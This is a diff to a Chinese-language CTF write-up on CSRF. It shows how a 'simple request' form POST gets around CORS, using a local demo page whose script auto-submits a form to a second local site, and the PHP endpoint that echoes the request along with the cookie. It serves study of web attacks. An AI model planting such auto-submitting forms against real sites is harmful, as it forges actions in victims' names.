@@ -74,7 +74,54 @@ CSRF 是一种攻击方式。当被害者访问恶意网站，导致自己在另
 
 ![](./images/8.jpg)
 
+> PS：我当时的猜想是盗取 cookie，但浏览器肯定是会阻止的，都 2202 年了，不太可能。以前盗取 cookie 都是在同源网站下找 XSS 的漏洞。
+
 # 复现题目
+
+这题主要是利用了简单请求来实现 POST 请求，从而绕过了 CORS。Orz
+
+## 简单请求
+
+那我们首先来看一下简单请求。
+```php
+<html>
+    <body>
+        <form id="form" method="post" action="http://192.168.1.82:1234/2.php">
+            <input name="foo" value="bar">
+            <input type="submit" value="Click me">
+        </form>
+        <script>
+            window.onload = () => { 
+                console.log("1.php"); 
+                form.submit();
+            }
+        </script>
+    </body>
+</html>
+```
+保存文件为 1.php。使用`php -S 192.168.1.82:8080`搭建一个简单的 Web。8080 端口定为网站 A。
+
+在另一个目录写下 2.php，代码为
+```php
+<?php
+
+echo "2.php: ";
+echo file_get_contents('php://input');
+
+?>
+```
+使用`php -S 192.168.1.82:1234`搭建网站 2，并在网站 2 添加一个 cookie（site=web2）。
+
+当访问网址 `http://192.168.1.82:8080/1.php` 的时候，网站 1 会自动向网站 2 发起请求，返回结果为
+```
+2.php: foo=bararray(1) {
+  ["site"]=>
+  string(4) "web2"
+}
+```
+
+# 简单请求：json
+
 
 
 
